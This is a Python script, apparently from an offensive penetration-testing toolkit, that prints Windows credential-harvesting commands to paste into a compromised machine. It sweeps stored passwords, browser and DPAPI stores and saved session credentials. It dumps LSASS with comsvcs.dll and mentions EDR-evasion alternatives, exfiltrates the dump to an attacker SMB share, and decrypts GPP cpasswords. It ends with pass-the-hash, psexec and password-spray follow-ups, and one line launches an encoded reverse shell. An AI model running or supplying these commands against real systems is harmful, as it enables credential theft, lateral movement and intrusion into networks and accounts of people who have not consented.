#!/usr/bin/env python3
"""CREDENTIAL HARVESTING (Windows) — the missing half of the funnel.

Popping SYSTEM is one path; the other is finding a credential that IS an admin. This emits
target-side discovery + an LSASS dump route. Everything on the TARGET is a built-in LOLBin
(reg / findstr / cmdkey / powershell / rundll32 comsvcs.dll) — nothing to install on the box.
The OFFLINE parse/crack runs on YOUR attacker box (tools noted; pre-stage the pip-only ones on
an air-gapped operator host).

PRINTS commands you paste into your foothold shell. Edit LHOST/LPORT in _winpriv_common.py.

Usage:
  python3 gen_creds.py [--mode hunt|lsass|gpp]

  hunt  (default) sweep stored-cred locations (unattend, cmdkey, AutoLogon, PS history, web.config, DPAPI, WiFi, RDP)
  lsass            dump LSASS via comsvcs.dll MiniDump (needs SeDebug/admin) -> offline pypykatz
  gpp              domain GPP cpassword in SYSVOL (any domain user can read it; AES key is public)
"""
import sys
import _winpriv_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

mode  = opt("--mode", "hunt")
stage = opt("--stagedir", P.STAGE).rstrip("\\")   # noexec/monitored Temp? override

if mode == "hunt":
    print("# STORED-CREDENTIAL SWEEP (read-only; all built-in LOLBins). Anything found may be a higher-priv account.\n")
    print("# --- unattended-install / sysprep answer files (often hold a local-admin password) ---")
    print(r'findstr /si password C:\Windows\Panther\*.xml C:\Windows\Panther\Unattend\*.xml C:\Windows\System32\Sysprep\*.xml C:\unattend.xml 2>nul')
    print(r'dir /s /b C:\*unattend*.xml C:\*sysprep*.inf 2>nul')
    print()
    print("# --- Windows Credential Manager (saved runas creds -> reuse WITHOUT knowing the plaintext) ---")
    print("cmdkey /list                                   REM if it lists a target, run as that identity:")
    print(r'runas /savecred /user:ADMINACCT "cmd /c powershell -e <REV_B64>"   REM reuses the stored secret')
    print()
    print("# --- registry AutoLogon (DefaultPassword in cleartext) ---")
    print(r'reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName')
    print(r'reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword')
    print()
    print("# --- PowerShell history + transcripts (creds typed on the CLI) ---")
    print(r'type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 2>nul')
    print(r'findstr /si "password passwd pwd secret ConvertTo-SecureString" %USERPROFILE%\*.ps1 %USERPROFILE%\*.txt 2>nul')
    print()
    print("# --- web/app config connection strings ---")
    print(r'findstr /si "connectionString password pwd= Data Source" C:\inetpub\wwwroot\web.config C:\inetpub\wwwroot\*\web.config 2>nul')
    print(r'dir /s /b C:\inetpub\*.config C:\*app.config C:\*.udl 2>nul')
    print(r'C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*  2>nul   REM IIS app-pool identities (run as SYSTEM/admin)')
    print()
    print("# --- other quick loot ---")
    print(r'reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i password   REM (noisy; scope with a subkey)')
    print(r'netsh wlan show profiles  &  for /f "tokens=4 delims=: " %a in (\'netsh wlan show profiles\') do @netsh wlan show profile name="%a" key=clear 2>nul | findstr Key')
    print(r'cmdkey /list & dir /s /b %USERPROFILE%\*.rdp %APPDATA%\Microsoft\Credentials\* 2>nul   REM saved RDP + DPAPI cred blobs')
    print(r'dir /s /b C:\Users\*\.aws\credentials C:\Users\*\.azure\* C:\Users\*\*.kdbx 2>nul   REM cloud creds / KeePass DBs')
    print()
    print("# --- app credential stores (SSH/RDP/DB clients often store reusable creds) ---")
    print(r'reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s 2>nul | findstr /i "HostName ProxyPassword ProxyUsername PublicKeyFile"')
    print(r'reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s 2>nul | findstr /i "HostName UserName Password"   REM WinSCP pw is weakly-encrypted -> decryptable')
    print(r'dir /s /b "%USERPROFILE%\*confCons.xml" 2>nul   REM mRemoteNG saved connections (weak AES; mremoteng-decrypt)')
    print(r'reg query "HKCU\Software\ORL\WinVNC3\Password" 2>nul & reg query "HKLM\SOFTWARE\RealVNC\vncserver" /v Password 2>nul   REM VNC (fixed-key DES)')
    print(r'dir /s /b "%APPDATA%\..\Local\Google\Chrome\User Data\*Login Data" "%APPDATA%\Mozilla\Firefox\Profiles\*\logins.json" 2>nul   REM browser creds -> offline: DonPAPI / firefox_decrypt')
    print(r'dir /s /b "%APPDATA%\Microsoft\Credentials\*" "%LOCALAPPDATA%\Microsoft\Credentials\*" 2>nul   REM DPAPI blobs -> mimikatz dpapi:: / DonPAPI (needs the masterkey)')
    print(r'schtasks /query /fo LIST /v 2>nul | findstr /i "Run As User Task To Run"   REM tasks that store a run-as cred')
    print()
    print(f"# Found a hash/cred? actioning (attacker box, you'll have these): ")
    print(f"#   nxc smb <target> -u USER -p 'PASS'            (validate + is it admin? 'Pwn3d!')")
    print(f"#   evil-winrm -i <target> -u USER -p 'PASS'      (interactive shell if WinRM open)")
    print(f"#   psexec.py 'DOM/USER:PASS@<target>'            (SYSTEM shell over SMB; impacket)")

elif mode == "lsass":
    dmp = f"{stage}\\ls.dmp"
    print("# LSASS MiniDump -> offline hash/ticket extraction. Needs SeDebugPrivilege (admin/SYSTEM).\n")
    print("# 0) confirm you're elevated:  whoami /priv | findstr /i debug   (SeDebugPrivilege = Enabled)\n")
    print("# 1) find the LSASS PID:")
    print(r'tasklist /fi "imagename eq lsass.exe"      REM note the PID (e.g. 712)')
    print("\n# 2) dump it with the built-in comsvcs.dll MiniDump export (LOLBin — nothing to install):")
    print(rf'rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> {dmp} full')
    print(f"#    (EDR often flags comsvcs MiniDump. Stealth alts: nanodump, or procdump.exe -accepteula -ma <PID> {dmp})")
    print("\n# 3) exfil the dump to the attacker (it's big; SMB is easiest):")
    print(f"#    impacket-smbserver share . -smb2support     (attacker)  ->  copy {dmp} \\\\{P.LHOST}\\share\\   (target)")
    print("\n# 4) parse OFFLINE on the attacker (NO tools needed on the target):")
    print("pypykatz lsa minidump ls.dmp        # plaintext/NT hashes + Kerberos tickets")
    print("#    ^ pypykatz is pip-only — PRE-STAGE it on an air-gapped operator box (`pipx install pypykatz`),")
    print("#      or parse on any Windows box with mimikatz:  sekurlsa::minidump ls.dmp / sekurlsa::logonpasswords")
    print(f"\n# 5) use what falls out:  nxc smb <target> -u USER -H <nthash>   |   psexec.py -hashes :<nthash> USER@<target>")
    print(f"# cleanup:  del {dmp}")

elif mode == "gpp":
    print("# GPP cpassword — Group Policy Preferences stored an AES-encrypted password in SYSVOL whose")
    print("# key MICROSOFT PUBLISHED. ANY domain user can read + decrypt it. Classic domain-wide local-admin pw.\n")
    print("# 1) search SYSVOL (readable by any domain user) for the cpassword attribute:")
    print(r'findstr /S /I cpassword \\<DC-or-domain>\SYSVOL\*.xml   REM Groups.xml/Services.xml/ScheduledTasks.xml/Drives.xml')
    print("\n# 2) decrypt OFFLINE on the attacker (the AES key is public):")
    print("gpp-decrypt '<cpassword-base64>'          # ships with Kali; or a 10-line python AES-CBC with the known key")
    print("#    also: nxc smb <DC> -u USER -p PASS -M gpp_password   (netexec module does the whole find+decrypt)")
    print(f"\n# -> usually a LOCAL admin password reused on many hosts. Spray it:  nxc smb <subnet> -u Administrator -p '<pw>' --local-auth")

else:
    print("mode must be 'hunt', 'lsass', or 'gpp'"); sys.exit(1)
